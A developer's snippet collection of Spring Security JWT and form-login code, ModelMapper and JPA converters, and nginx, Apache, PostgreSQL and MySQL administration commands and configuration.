import static com.auth0.samples.authapi.security.SecurityConstants.EXPIRATION_TIME;

import static com.auth0.samples.authapi.security.SecurityConstants.HEADER_STRING;

import static com.auth0.samples.authapi.security.SecurityConstants.SECRET;

import static com.auth0.samples.authapi.security.SecurityConstants.TOKEN_PREFIX;

public class JWTAuthenticationFilter extends UsernamePasswordAuthenticationFilter {

    private AuthenticationManager authenticationManager;

    public JWTAuthenticationFilter(AuthenticationManager authenticationManager) {

        this.authenticationManager = authenticationManager;

    }

    @Override

    public Authentication attemptAuthentication(HttpServletRequest req,

                                                HttpServletResponse res) throws AuthenticationException {

        try {

            ApplicationUser creds = new ObjectMapper()

                    .readValue(req.getInputStream(), ApplicationUser.class);

            return authenticationManager.authenticate(

                    new UsernamePasswordAuthenticationToken(

                            creds.getUsername(),

                            creds.getPassword(),

                            new ArrayList<>())

            );

        } catch (IOException e) {

            throw new RuntimeException(e);

        }

    }

    @Override

    protected void successfulAuthentication(HttpServletRequest req,

                                            HttpServletResponse res,

                                            FilterChain chain,

                                            Authentication auth) throws IOException, ServletException {

        String token = Jwts.builder()

                .setSubject(((User) auth.getPrincipal()).getUsername())

                .setExpiration(new Date(System.currentTimeMillis() + EXPIRATION_TIME))

                .signWith(SignatureAlgorithm.HS512, SECRET)

                .compact();

        res.addHeader(HEADER_STRING, TOKEN_PREFIX + token);

    }

}

import io.jsonwebtoken.Jwts;

import org.springframework.security.authentication.AuthenticationManager;

import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;

import org.springframework.security.core.context.SecurityContextHolder;

import org.springframework.security.web.authentication.www.BasicAuthenticationFilter;

import javax.servlet.FilterChain;

import javax.servlet.ServletException;

import javax.servlet.http.HttpServletRequest;

import javax.servlet.http.HttpServletResponse;

import java.io.IOException;

import java.util.ArrayList;

import static com.auth0.samples.authapi.security.SecurityConstants.HEADER_STRING;

import static com.auth0.samples.authapi.security.SecurityConstants.SECRET;

import static com.auth0.samples.authapi.security.SecurityConstants.TOKEN_PREFIX;

public class JWTAuthorizationFilter extends BasicAuthenticationFilter {

    public JWTAuthorizationFilter(AuthenticationManager authManager) {

        super(authManager);

    }

    @Override

    protected void doFilterInternal(HttpServletRequest req,

                                    HttpServletResponse res,

                                    FilterChain chain) throws IOException, ServletException {

        String header = req.getHeader(HEADER_STRING);

        if (header == null || !header.startsWith(TOKEN_PREFIX)) {

            chain.doFilter(req, res);

            return;

        }

        UsernamePasswordAuthenticationToken authentication = getAuthentication(req);

        SecurityContextHolder.getContext().setAuthentication(authentication);

        chain.doFilter(req, res);

    }

    private UsernamePasswordAuthenticationToken getAuthentication(HttpServletRequest request) {

        String token = request.getHeader(HEADER_STRING);

        if (token != null) {

            // parse the token.

            String user = Jwts.parser()

                    .setSigningKey(SECRET)

                    .parseClaimsJws(token.replace(TOKEN_PREFIX, ""))

                    .getBody()

                    .getSubject();

            if (user != null) {

                return new UsernamePasswordAuthenticationToken(user, null, new ArrayList<>());

            }

            return null;

        }

        return null;

    }

}
--------------------------------------------------------------------------------------------------------
import javax.sql.DataSource;
 
import org.o7planning.sbsecurity.service.UserDetailsServiceImpl;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.web.authentication.rememberme.JdbcTokenRepositoryImpl;
import org.springframework.security.web.authentication.rememberme.PersistentTokenRepository;
 
@Configuration
@EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
 
    @Autowired
    private UserDetailsServiceImpl userDetailsService;
 
    @Autowired
    private DataSource dataSource;
 
    @Bean
    public BCryptPasswordEncoder passwordEncoder() {
        BCryptPasswordEncoder bCryptPasswordEncoder = new BCryptPasswordEncoder();
        return bCryptPasswordEncoder;
    }
 
    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
 
        // Setting Service to find User in the database.
        // And Setting PassswordEncoder
        auth.userDetailsService(userDetailsService).passwordEncoder(passwordEncoder());
 
    }
 
    @Override
    protected void configure(HttpSecurity http) throws Exception {
 
        http.csrf().disable();
 
        // The pages does not require login
        http.authorizeRequests().antMatchers("/", "/login", "/logout").permitAll();
 
        // /userInfo page requires login as ROLE_USER or ROLE_ADMIN.
        // If no login, it will redirect to /login page.
        http.authorizeRequests().antMatchers("/userInfo").access("hasAnyRole('ROLE_USER', 'ROLE_ADMIN')");
 
        // For ADMIN only.
        http.authorizeRequests().antMatchers("/admin").access("hasRole('ROLE_ADMIN')");
 
        // When the user has logged in as XX.
        // But access a page that requires role YY,
        // AccessDeniedException will be thrown.
        http.authorizeRequests().and().exceptionHandling().accessDeniedPage("/403");
 
        // Config for Login Form
        http.authorizeRequests().and().formLogin()//
                // Submit URL of login page.
                .loginProcessingUrl("/j_spring_security_check") // Submit URL
                .loginPage("/login")//
                .defaultSuccessUrl("/userAccountInfo")//
                .failureUrl("/login?error=true")//
                .usernameParameter("username")//
                .passwordParameter("password")
                // Config for Logout Page
                .and().logout().logoutUrl("/logout").logoutSuccessUrl("/logoutSuccessful");
 
        // Config Remember Me.
        http.authorizeRequests().and() //
                .rememberMe().tokenRepository(this.persistentTokenRepository()) //
                .tokenValiditySeconds(1 * 24 * 60 * 60); // 24h
 
    }
 
    @Bean
    public PersistentTokenRepository persistentTokenRepository() {
        JdbcTokenRepositoryImpl db = new JdbcTokenRepositoryImpl();
        db.setDataSource(dataSource);
        return db;
    }
 
}
--------------------------------------------------------------------------------------------------------
// Token stored in Table (Persistent_Logins)
@Bean
public PersistentTokenRepository persistentTokenRepository() {
    JdbcTokenRepositoryImpl db = new JdbcTokenRepositoryImpl();
    db.setDataSource(this.dataSource);
    return db;
}
 
// Token stored in Memory (Of Web Server).
@Bean
public PersistentTokenRepository persistentTokenRepository() {
    InMemoryTokenRepositoryImpl memory = new InMemoryTokenRepositoryImpl();
    return memory;
}
--------------------------------------------------------------------------------------------------------
    @Autowired
    private AuthenticationManager authenticationManager;
--------------------------------------------------------------------------------------------------------
public class CollectionsBean {
 
    @Value("${names.list:}#{T(java.util.Collections).emptyList()}")
    private List<String> nameListWithDefaultValue;
     
    public void printNameListWithDefaults() {
        System.out.println(nameListWithDefaultValue);
    }
}

https://github.com/modelmapper/modelmapper/issues/217
--------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.response.FileResponse;
//import com.paragon.microservices.distributor.model.entity.FileEntity;
//import org.modelmapper.Converter;
//import org.modelmapper.spi.MappingContext;
//import org.springframework.stereotype.Component;
//
//import java.util.Optional;
//
//@Component
//public class FileEntityToFileResponseConverter implements Converter<FileEntity, FileResponse> {
//
//    @Override
//    public FileResponse convert(final MappingContext<FileEntity, FileResponse> context) {
//        final FileEntity source = context.getSource();
//        final FileResponse dest = Optional.ofNullable(context.getDestination()).orElseGet(FileResponse::new);
//        dest.setId(source.getId());
//        dest.setVersionId(source.getVersion().getId().toString());
//        dest.setCreatedDate(source.getCreatedDate());
//        dest.setLastModifiedDate(source.getLastModifiedDate());
//        dest.setVersionId(source.getVersion().getId().toString());
//        dest.setFileName(source.getFileInfo().getFileName());
//        dest.setFilePath(source.getFileInfo().getFilePath());
//        dest.setFilePlatform(source.getFileInfo().getFilePlatform());
//        return dest;
//    }
//}

//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.response.FileResponse;
//import com.paragon.microservices.distributor.model.entity.FileEntity;
//import com.paragon.microservices.distributor.model.entity.FileInfoEntity;
//import org.modelmapper.Converter;
//import org.modelmapper.spi.MappingContext;
//import org.springframework.stereotype.Component;
//
//import java.util.Optional;
//
//@Component
//public class FileResponseToFileEntityConverter implements Converter<FileResponse, FileEntity> {
//
//    @Override
//    public FileEntity convert(final MappingContext<FileResponse, FileEntity> context) {
//        final FileResponse source = context.getSource();
//        final FileEntity dest = Optional.ofNullable(context.getDestination()).orElseGet(FileEntity::new);
//        dest.setId(source.getId());
//        dest.setFileInfo(this.getFileInfoEntity(source));
//        return dest;
//    }
//
//    private FileInfoEntity getFileInfoEntity(final FileResponse source) {
//        return FileInfoEntity
//                .builder()
//                .fileName(source.getFileName())
//                .filePath(source.getFilePath())
//                .filePlatform(source.getFilePlatform())
//                .build();
//    }
//}
//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.request.FileCreateRequest;
//import com.paragon.microservices.distributor.model.dto.request.ProductCreateRequest;
//import com.paragon.microservices.distributor.model.dto.response.FileResponse;
//import com.paragon.microservices.distributor.model.entity.FileEntity;
//import com.paragon.microservices.distributor.model.entity.ProductEntity;
//import org.modelmapper.Converter;
//import org.modelmapper.spi.MappingContext;
//
//import java.util.Optional;
//
//public class ProductCreateRequestToProductEntityConverter implements Converter<ProductCreateRequest, ProductEntity> {
//
//    @Override
//    public ProductEntity convert(final MappingContext<ProductCreateRequest, ProductEntity> context) {
//        final ProductCreateRequest source = context.getSource();
//        final ProductEntity dest = Optional.ofNullable(context.getDestination()).orElseGet(ProductEntity::new);
//        dest.setName(source.getName());
//        dest.setSku(source.getSku());
//    }
//}
//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.response.VersionResponse;
//import com.paragon.microservices.distributor.model.entity.VersionEntity;
//import com.paragon.microservices.distributor.model.entity.VersionInfoEntity;
//import com.paragon.microservices.distributor.model.formatter.VersionInfoFormatter;
//import org.modelmapper.Converter;
//import org.modelmapper.spi.MappingContext;
//import org.springframework.beans.factory.annotation.Autowired;
//import org.springframework.stereotype.Component;
//
//import java.text.ParseException;
//import java.util.Locale;
//import java.util.Optional;
//
//@Component
//public class VersionResponseToVersionEntityConverter implements Converter<VersionResponse, VersionEntity> {
//
//    @Autowired
//    private VersionInfoFormatter formatter;
//
//    @Override
//    public VersionEntity convert(final MappingContext<VersionResponse, VersionEntity> context) {
//        final VersionResponse source = context.getSource();
//        final VersionEntity dest = Optional.ofNullable(context.getDestination()).orElseGet(VersionEntity::new);
//        dest.setVersionInfo(this.getVersionInfo(source.getVersionInfo()));
//        dest.setChangeLog(source.getChangeLog());
//        dest.setLocale(source.getLocale());
//        dest.setId(source.getId());
//        return dest;
//    }
//
//    private VersionInfoEntity getVersionInfo(final String version) {
//        try {
//            return this.formatter.parse(version, Locale.getDefault());
//        } catch (ParseException e) {
//            return null;
//        }
//    }
//}
//package com.paragon.microservices.distributor.system.mapper;
//
//import com.paragon.microservices.distributor.model.dto.request.ProductCreateRequest;
//import com.paragon.microservices.distributor.model.entity.ProductEntity;
//import org.modelmapper.PropertyMap;
//import org.springframework.stereotype.Component;
//
//@Component
//public class ProductCreateRequestToProductEntityPropertyMap extends PropertyMap<ProductCreateRequest, ProductEntity> {
//
//    @Override
//    protected void configure() {
////        skip(this.destination.getId());
////        skip(this.destination.getCreatedBy());
////        skip(this.destination.getCreatedDate());
////        skip(this.destination.getLastModifiedBy());
////        skip(this.destination.getLastModifiedDate());
////        skip(this.destination.getRowVersion());
//
//        skip().setId(null);
//        skip().setRowVersion(null);
//        skip().setCreatedBy(null);
//        skip().setCreatedDate(null);
//        skip().setLastModifiedBy(null);
//        skip().setLastModifiedDate(null);
//    }
//}

//package com.paragon.microservices.distributor.system.mapper;
//
//import com.paragon.microservices.distributor.model.dto.response.ProductResponse;
//import com.paragon.microservices.distributor.model.entity.ProductEntity;
//import org.modelmapper.PropertyMap;
//import org.springframework.stereotype.Component;
//
//@Component
//public class ProductEntityToProductResponsePropertyMap extends PropertyMap<ProductEntity, ProductResponse> {
//
//    @Override
//    protected void configure() {
////        map(this.source.getCreatedBy().get()).setCreatedBy(null);
////        map(this.source.getCreatedDate().get()).setCreatedDate(null);
////        map(this.source.getLastModifiedBy().get()).setLastModifiedBy(null);
////        map(this.source.getLastModifiedDate().get()).setLastModifiedDate(null);
//        skip(this.destination.getCreatedBy());
//        skip(this.destination.getCreatedDate());
//        skip(this.destination.getLastModifiedBy());
//        skip(this.destination.getLastModifiedDate());
//    }
//}

--------------------------------------------------------------------------------------------------------

import javax.persistence.EntityManager;
import javax.persistence.NoResultException;
import javax.persistence.Query;
 
import org.o7planning.sbsecurity.entity.AppUser;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Repository;
import org.springframework.transaction.annotation.Transactional;
 
@Repository
@Transactional
public class AppUserDAO {
 
    @Autowired
    private EntityManager entityManager;
 
    public AppUser findUserAccount(String userName) {
        try {
            String sql = "Select e from " + AppUser.class.getName() + " e " //
                    + " Where e.userName = :userName ";
 
            Query query = entityManager.createQuery(sql, AppUser.class);
            query.setParameter("userName", userName);
 
            return (AppUser) query.getSingleResult();
        } catch (NoResultException e) {
            return null;
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Component
public class AuditApplicationEventListener {
 
    private static final Logger LOG = LoggerFactory.getLogger(AuditApplicationEventListener.class);
 
    @Autowired
    private ApplicationEventPublisher applicationEventPublisher;
 
    @EventListener(condition = "#event.auditEvent.type != 'CUSTOM_AUDIT_EVENT'")
    @Async
    public void onAuditEvent(AuditApplicationEvent event) {
        AuditEvent actualAuditEvent = event.getAuditEvent();
 
        LOG.info("On audit application event: timestamp: {}, principal: {}, type: {}, data: {}",
            actualAuditEvent.getTimestamp(),
            actualAuditEvent.getPrincipal(),
            actualAuditEvent.getType(),
            actualAuditEvent.getData()
        );
        applicationEventPublisher.publishEvent(
            new AuditApplicationEvent(
                new AuditEvent(actualAuditEvent.getPrincipal(), "CUSTOM_AUDIT_EVENT")
            )
        );
    }
 
    @EventListener(condition = "#event.auditEvent.type == 'CUSTOM_AUDIT_EVENT'")
    public void onCustomAuditEvent(AuditApplicationEvent event) {
        LOG.info("Handling custom audit event ...");
    }
}
--------------------------------------------------------------------------------------------------------
@RestController
@RequestMapping("/token")
public class AuthenticationController {

    @Autowired
    private AuthenticationManager authenticationManager;

    @Autowired
    private JwtTokenUtil jwtTokenUtil;

    @Autowired
    private UserService userService;

    @RequestMapping(value = "/generate-token", method = RequestMethod.POST)
    public ResponseEntity register(@RequestBody LoginUser loginUser) throws AuthenticationException {

        final Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                        loginUser.getUsername(),
                        loginUser.getPassword()
                )
        );
        SecurityContextHolder.getContext().setAuthentication(authentication);
        final User user = userService.findOne(loginUser.getUsername());
        final String token = jwtTokenUtil.generateToken(user);
        return ResponseEntity.ok(new AuthToken(token));
    }
}
--------------------------------------------------------------------------------------------------------
@Bean
public FlywayMigrationStrategy repairStrategy() {
    return flyway -> {
        flyway.repair();
        flyway.migrate();
    };
}
--------------------------------------------------------------------------------------------------------
spring.main.web-application-type=none
--------------------------------------------------------------------------------------------------------
private static <S, D> TypeMap<S, D> createTypeMap(
  ModelMapper mapper, Class<S> sourceType, Class<D> destinationType, Configuration config) {
 return mapper
   .createTypeMap(sourceType, destinationType, config)
   // We setPropertyCondition because ModelMapper seems to ignore this in
   // the config
   .setPropertyCondition(config.getPropertyCondition());
}
--------------------------------------------------------------------------------------------------------
300: jar:file:///C:/Users/Alex/AppData/Roaming/Mozilla/Firefox/Profiles/gungst61.default-1499496685605/extensions/%7Bad0d925d-88f8-47f1-85ea-8463569e756e%7D.xpi!/
200: filename content-length last-modified file-type
201: META-INF/ 0 Mon,%2031%20Dec%201979%2021:00:00%20GMT DIRECTORY
201: _locales/ 0 Fri,%2023%20Feb%202018%2011:29:30%20GMT DIRECTORY
201: blank.html 381 Fri,%2023%20Feb%202018%2011:29:28%20GMT FILE
201: icons/ 0 Fri,%2023%20Feb%202018%2011:29:30%20GMT DIRECTORY
201: images/ 0 Fri,%2023%20Feb%202018%2011:29:30%20GMT DIRECTORY
201: index.html 75555 Fri,%2023%20Feb%202018%2011:29:28%20GMT FILE
201: manifest.json 853 Fri,%2023%20Feb%202018%2011:29:28%20GMT FILE
201: scripts/ 0 Fri,%2023%20Feb%202018%2011:29:30%20GMT DIRECTORY
201: styles/ 0 Fri,%2023%20Feb%202018%2011:29:30%20GMT DIRECTORY
--------------------------------------------------------------------------------------------------------
String entityPackage = JpaMarkerModel.class.getPackage().getName();
 
import java.awt.Color;
import javax.persistence.AttributeConverter;
import javax.persistence.Converter;
 
@Converter
public class ColorConverter implements AttributeConverter&amp;amp;lt;Color, String&amp;amp;gt; {
 
 private static final String SEPARATOR = "|";
 
 /**
 * Convert Color object to a String
 * with format red|green|blue|alpha
 */
 @Override
 public String convertToDatabaseColumn(Color color) {
     StringBuilder sb = new StringBuilder();
     sb.append(color.getRed()).append(SEPARATOR)
       .append(color.getGreen())
       .append(SEPARATOR)
       .append(color.getBlue())
       .append(SEPARATOR)
       .append(color.getAlpha());
    return sb.toString();
 }
 
 /**
 * Convert a String with format red|green|blue|alpha
 * to a Color object
 */
 @Override
 public Color convertToEntityAttribute(String colorString) {
     String[] rgb = colorString.split(SEPARATOR);
     return new Color(Integer.parseInt(rgb[0]),
                      Integer.parseInt(rgb[1]),
                      Integer.parseInt(rgb[2]),
                      Integer.parseInt(rgb[3]));
 }
} 
--------------------------------------------------------------------------------------------------------
@Converter(autoApply = true)
public class VehicleConverter implements AttributeConverter<Vehicle, String> {
 
    @Override
    public String convertToDatabaseColumn(Vehicle vehicle) {
        return vehicle.getShortName();
    }
 
    @Override
    public Vehicle convertToEntityAttribute(String dbData) {
        return Vehicle.fromShortName(dbData);
    }
 
}
--------------------------------------------------------------------------------------------------------
import org.springframework.core.annotation.AliasFor;
import org.springframework.stereotype.Component;

import javax.persistence.Converter;
import java.lang.annotation.*;

@Documented
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Component
@Converter
public @interface ConverterComponent {

    @AliasFor(annotation = Component.class, attribute = "value") String value() default "";

    @AliasFor(annotation = Converter.class, attribute = "autoApply") boolean autoApply() default true;
}
--------------------------------------------------------------------------------------------------------
hekate.name=Hekate
hekate.version=${project.version}
hekate.build.date=${build.date}
hekate.git.revision=${git.commit.id}
--------------------------------------------------------------------------------------------------------
import com.google.errorprone.BugPattern;
import com.google.errorprone.BugPattern.ProvidesFix;
import com.google.errorprone.VisitorState;
import com.google.errorprone.bugpatterns.BugChecker.AssertTreeMatcher;
import com.google.errorprone.fixes.SuggestedFix;
import com.google.errorprone.matchers.Description;
import com.google.errorprone.matchers.Matcher;
import com.sun.source.tree.AssertTree;

/** @author sebastian.h.monte@gmail.com (Sebastian Monte) */
@BugPattern(
    name = "AssertFalse",
    summary =
        "Assertions may be disabled at runtime and do not guarantee that execution will "
            + "halt here; consider throwing an exception instead",
    category = JDK,
    severity = WARNING,
    providesFix = ProvidesFix.REQUIRES_HUMAN_ATTENTION)
public class AssertFalse extends BugChecker implements AssertTreeMatcher {

  private static final Matcher<AssertTree> ASSERT_FALSE_MATCHER =
      assertionWithCondition(booleanLiteral(false));

  @Override
  public Description matchAssert(AssertTree tree, VisitorState state) {
    if (!ASSERT_FALSE_MATCHER.matches(tree, state)) {
      return Description.NO_MATCH;
    }

    return describeMatch(tree, SuggestedFix.replace(tree, "throw new AssertionError()"));
  }
}
--------------------------------------------------------------------------------------------------------
@Embeddable
public class AccountBalance {
    private Calendar date;

    @Type(type = Amount.TYPE_DEF)
    @Columns(columns = {
        @Column(name = "amount"),
        @Column(name = "currencyCode")})
    private Amount amount;
}

public class AccountStatement
    @AttributeOverrides(value = {
        @AttributeOverride(name = "date", column = @Column(name = "openingBalanceDate") ),
        @AttributeOverride(name = "amount.amount", column = @Column(name = "openingBalanceAmount") ),
        @AttributeOverride(name = "amount.currencyCode", column = @Column(name = "openingBalanceCurrency") )})
    @Embedded
    @Basic(optional = true)
    private AccountBalance openingBalance;

    @AttributeOverrides(value = {
        @AttributeOverride(name = "date", column = @Column(name = "closingBalanceDate") ),
        @AttributeOverride(name = "amount.amount", column = @Column(name = "closingBalanceAmount") ),
        @AttributeOverride(name = "amount.currencyCode", column = @Column(name = "closingBalanceCurrency") )})
    @Embedded
    @Basic(optional = true)
    private AccountBalance closingBalance;
--------------------------------------------------------------------------------------------------------
mkdir /var/www/testsite.com
echo "Hello World" > /var/www/testsite.com/index.php
chmod -R 755 /var/www/testsite.com

cp /etc/nginx/sites-available/default /etc/nginx/sites-available/testsite.com.conf

server {
    listen 80;

    server_name testsite.com;

    rewrite ^ https://testsite.com$request_uri? permanent;
}

server {
    listen 443 ssl http2;

    ssl_certificate /etc/letsencrypt/live/testsite.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/testsite.com/privkey.pem;
    ssl_stapling on;

    server_name testsite.com;

    root /var/www/testsite.com;

    location / {
        try_files $uri /index.php?$args;
    }

    location ~ \.php$ {
        try_files $uri =404;
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/run/php/php7.0-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
    }
}

map $http_user_agent $ua_device {
    default "desktop";
    "~*(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge\ |maemo|midp|mmp|mobile.+firefox|netfront|opera\ m(ob|in)i|palm(\ os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows\ ce|xda|xiino/i" "mobile";
    "~*android|ipad|playbook|silk/i" "tablet";
}

autoindex_exact_size; - This directive specifies whether Nginx should display the exact file sizes of the output in the directory index or simply round to the nearest KB, MB, or GB. This directive has 2 options: on | off.
autoindex_format; - This directive specifies what format the Nginx index listing should be outputted to. This directive has 4 options: html | xml | json | jsonp.
autoindex_localtime; - This directive specifies whether the times for the directory listing should be outputted to local time or UTC. This directive has 2 options: on | off.
An example of a location directive using all 4 autoindex options could resemble the following.

location /somedirectory/ {
    autoindex on;
    autoindex_exact_size off;
    autoindex_format html;
    autoindex_localtime on;
}

ln -s /etc/nginx/sites-available/testsite.com.conf /etc/nginx/sites-enabled/testsite.com.conf
service nginx restart
--------------------------------------------------------------------------------------------------------
$ /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222 --no-first-run --no-default-browser-check --user-data-dir=$(mktemp -d -t 'chrome-remote_data_dir')
--------------------------------------------------------------------------------------------------------
$ curl "https://tools.keycdn.com/geo.json?host={IP or hostname}"
--------------------------------------------------------------------------------------------------------
sudo tail /var/log/apache/access.log
sudo tail /var/log/apache2/access.log

sudo tail /var/log/apache2/error.log

LogFormat "%h %l %u %t \"%r\" %>s %b" common.

Now let’s break down what each section of that log means.

%h - The IP address of the client.
%l - The identity of the client determined by identd on the client’s machine. Will return a hyphen (-) if this information is not available.
%u - The userid of the client if the request was authenticated.
%t - The time that the request was received.
\"%r\" - The request line that includes the HTTP method used, the requested resource path, and the HTTP protocol that the client used.
%>s - The status code that the server sends back to the client.
%b - The size of the object requested

LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-agent}i\"" combined
CustomLog log/access_log combined
--------------------------------------------------------------------------------------------------------
.htaccess needs to be enabled with AllowOverride

# BEGIN WordPress
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteRule ^index\.php$ - [L]
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule>
# END WordPress

sudo service apache2 restart

<Directory /var/www/wordpress>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Order allow,deny
    allow from all

    # BEGIN WordPress
    <IfModule mod_rewrite.c>
        RewriteEngine On
        RewriteBase /
        RewriteRule ^index\.php$ - [L]
        RewriteCond %{REQUEST_FILENAME} !-f
        RewriteCond %{REQUEST_FILENAME} !-d
        RewriteRule . /index.php [L]
    </IfModule>
    # END WordPress
</Directory>

sudo apache2ctl -t

location ~ /wp-content/themes/.*\.(js|css)$ {
    add_header Cache-Control no-cache;
}
location ~ genericons\.css {
    add_header Cache-Control no-cache;
}

<FilesMatch "genericons\.css">
    Header set Cache-Control "no-cache"
</FilesMatch>

<FilesMatch "\.(png|xml)$">
    Header set Cache-Control "no-cache"
</FilesMatch>

LogLevel alert rewrite:trace6
--------------------------------------------------------------------------------------------------------
Mac / Linux: traceroute6 2a00:1450:400a:804::2004
Windows: tracert -6 2a00:1450:400a:804::2004
--------------------------------------------------------------------------------------------------------
apt-get update
apt-get install nginx
Once Nginx has been installed, the next step is to disable the default virtual host.

unlink /etc/nginx/sites-enabled/default
Then, we need to create a file within the /etc/nginx/sites-available directory that contains the reverse proxy information. We can name this reverse-proxy.conf for example.

server {
    listen 80;
    location / {
        proxy_pass http://192.x.x.2;
    }
}

ln -s /etc/nginx/sites-available/reverse-proxy.conf /etc/nginx/sites-enabled/reverse-proxy.conf

service nginx configtest
service nginx restart
--------------------------------------------------------------------------------------------------------
sudo vi /etc/network/interfaces

### Start IPV6 static configuration
iface eth0 inet6 static
address 2607:f0d0:2001:000a:0000:0000:0000:0010
netmask 64
gateway 2607:f0d0:2001:000a:0000:0000:0000:0001
### END IPV6 configuration

sudo systemctl restart networking

ifconfig eth0
ip -6 address show eth0
--------------------------------------------------------------------------------------------------------
log_directory = 'pg_log'                    
log_filename = 'postgresql-dateformat.log'
log_statement = 'all'
logging_collector = on
--------------------------------------------------------------------------------------------------------
ALTER DATABASE your_database_name SET log_statement = 'all';
--------------------------------------------------------------------------------------------------------
Header set Custom-Header-Name "Custom Header Value"
add_header Custom-Header-Name "Custom Header Value"
--------------------------------------------------------------------------------------------------------
Ensure that you have the following libraries installed on your server. Otherwise, the mod_cdn module may not work as expected.

sudo apt-get install libxml2-dev libapr1-dev apache2-dev libssl-dev
From your CLI, download the mod_cdn module with the following snippet and change into the mod_cdn-1.1.0 directory once the file has been unzipped.

wget http://agile.internap.com/assets/mod_cdn-1.1.0.tar.gz
Compile the mod_cdn from source against Apache 2.2.7 or higher.

Copy mod_cdn.so to the following directory /usr/lib/apache2/modules/. Additionally, ensure that the cdn.load file contains the following:

LoadFile /usr/lib/libxml2.so.2
LoadFile /usr/lib/libssl.so.0.9.8
LoadModule cdn_module /usr/lib/apache2/modules/mod_cdn.so
Now, we need to copy the cdn.load and cdn.conf files into the /etc/apache2/mods-available/ directory with the following command.

cd /etc/apache2/mods-enabled
cp cdn.load /etc/apache2/mods-available/
cp cdn.conf /etc/apache2/mods-available/
Then, link them from mods-enabled with the following.

ln -s ../mods-available/cdn.conf cdn.conf
ln -s ../mods-available/cdn.load cdn.load
There are a variety of Apache directives that can be used within your configuration file to properly deliver the desired static assets from the CDN instead of the origin server. You must define the following snippet within the if you want to rewrite all of your site’s static assets to use the CDN URL. However, you can also specifically define a set of directives for a particular directory if you do not want to accelerate the entire website.

<IfModule mod_cdn.c>
    CDNHTMLDocType XHTML
    CDNHTMLToServer https://cdn.yourwebsite.com
    CDNHTMLFromServers https://yourwebsite.com
    CDNHTMLRemapURLServer \.png$ i
    CDNHTMLRemapURLServer \.jpg$ i
    CDNHTMLRemapURLServer \.gif$ i
    CDNHTMLRemapURLServer \.css$ i
    CDNHTMLRemapURLServer \.js$ i

    CDNHTMLLinks img src
    CDNHTMLLinks link href
    CDNHTMLLinks object data
    CDNHTMLLinks input src
    CDNHTMLLinks script src
    CDNHTMLLinks a href
</IfModule>
The snippet above enables the Apache CDN configuration by telling the server which extensions should be replaced. The CDNHTMLToServer directive corresponds to your CDN’s Zone URL (e.g. lorem-1c6b.kxcdn.com) or Zone Alias (e.g. cdn.yourwebsite.com). The CDNHTMLFromServers corresponds to your origin domain. The CDNHTMLRemapURLServer directive defines the extensions for which you want to accelerate. Finally, the CDNHTMLLinks directive defines the tag / attribute pair for which the module expects to find links to content in order to replace them.

Once you have defined the snippet from step 5 in your Apache’s configuration file, save your changes and restart Apache with the following command service apache2 restart. Once Apache has restarted, go to your website and view the page source to ensure that the static assets you have defined are being properly rewritten to reflect the CDN URL.
--------------------------------------------------------------------------------------------------------
server {
    listen 80;
    server_name domain.com www.domain.com;
    return 301 https://domain.com$request_uri;
}

RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]

<configuration>
    <system.webServer>
        <rewrite>
            <rules>
                <rule name="https redirect">
                    <match url="(.*)" ignoreCase="false" />
                    <conditions>
                        <add input="{HTTPS}" pattern="off" ignoreCase="false" />
                    </conditions>
                    <action type="Redirect" redirectType="Found" url="https://{HTTP_HOST}{REQUEST_URI}" />
                </rule>
            </rules>
        </rewrite>
    </system.webServer>
</configuration>
--------------------------------------------------------------------------------------------------------
mysqladmin -u userX -p oldpassword newpassword

/etc/init.d/mysql stop
mysqld_safe --skip-grant-tables &
mysql -u root
use mysql;
update user set password=PASSWORD("newpassword") where User='root';
flush privileges;
quit
/etc/init.d/mysql stop
/etc/init.d/mysql start
--------------------------------------------------------------------------------------------------------
server {
    listen 443 ssl http2;

    ssl_certificate server.crt;
    ssl_certificate_key server.key;
}
service nginx reload
--------------------------------------------------------------------------------------------------------
log_format combined '$remote_addr - $remote_user [$time_local]'
    '"$request" $status $body_bytes_sent '
    '"$http_referer" "$http_user_agent"';
access_log /var/log/nginx/access.log log_file combined;
	
error_log /var/log/nginx/error.log warn;

debug - Useful debugging information to help determine where the problem lies.
info - Informational messages that aren’t necessary to read but may be good to know.
notice - Something normal happened that is worth noting.
warn - Something unexpected happened, however is not a cause for concern.
error - Something was unsuccessful.
